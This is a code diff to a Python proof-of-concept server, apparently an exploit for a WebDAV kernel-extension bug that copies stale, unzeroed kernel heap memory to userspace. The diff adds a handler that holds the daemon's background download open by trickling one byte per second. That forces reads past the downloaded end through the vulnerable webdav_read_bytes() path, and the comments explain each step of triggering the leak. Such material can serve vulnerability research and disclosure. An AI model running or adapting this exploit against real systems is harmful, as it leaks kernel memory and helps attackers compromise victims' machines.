@@ -17,6 +17,12 @@ closes. This server makes that happen:
     daemon's network_read() sees EOF, forwards the short reply to the
     kernel, and closes the per-request socket. translate_status_to_error
     maps all 2xx to success, so no error is ever reported.
+  * A plain GET (no Range) is the daemon's background whole-file download;
+    it is answered with full Content-Length but the body is trickled at
+    1 byte/sec forever, so the download never finishes.  This keeps
+    UF_NODUMP set on the cache file, which is the condition that makes
+    pread() past the downloaded end go through webdav_read_bytes() (the
+    buggy path) instead of being served from the cache file.
 
 The shortfall (count - received) is stale, unzeroed kernel heap copied to
 userspace.
@@ -27,6 +33,7 @@ Stdlib only. Tested with curl; see README.md.
 import argparse
 import logging
 import sys
+import time
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 FILE_PATH = "/poc.bin"
@@ -174,15 +181,29 @@ class WebdavPwnHandler(BaseHTTPRequestHandler):
             if send:
                 self.wfile.write(BODY_BYTE * send)
         else:
-            send = min(body_len, FILE_SIZE)
-            LOG.info("GET %s (no Range) -> 200 SENDING=%d of %d",
-                     self.path, send, FILE_SIZE)
-            self._reply(200, send, {
-                "Accept-Ranges": "bytes",
-                "Content-Type": "application/octet-stream",
-            })
-            if send:
-                self.wfile.write(BODY_BYTE * send)
+            # Plain GET = the mount daemon's background download of the
+            # whole file.  NEVER let it finish: keep the connection open
+            # and trickle 1 byte/sec so the kext keeps UF_NODUMP set on the
+            # cache file.  Only then does pread() past the downloaded end
+            # take the buggy webdav_read_bytes() path (which issues its own
+            # Range GET on a second connection -- handled above).
+            LOG.info("GET %s (no Range) -> 200 trickle, download held open",
+                     self.path)
+            self.send_response(200)
+            self.send_header("Content-Length", str(FILE_SIZE))
+            self.send_header("Accept-Ranges", "bytes")
+            self.send_header("Content-Type", "application/octet-stream")
+            self.end_headers()
+            sent = 0
+            try:
+                while True:
+                    self.wfile.write(BODY_BYTE)
+                    self.wfile.flush()
+                    sent += 1
+                    time.sleep(1)
+            except (BrokenPipeError, ConnectionResetError, OSError):
+                pass
+            LOG.info("GET %s trickle ended after %d bytes", self.path, sent)
 
     # Everything else: refuse politely but keep the connection semantics.
     def do_PUT(self):    self._refuse("PUT")
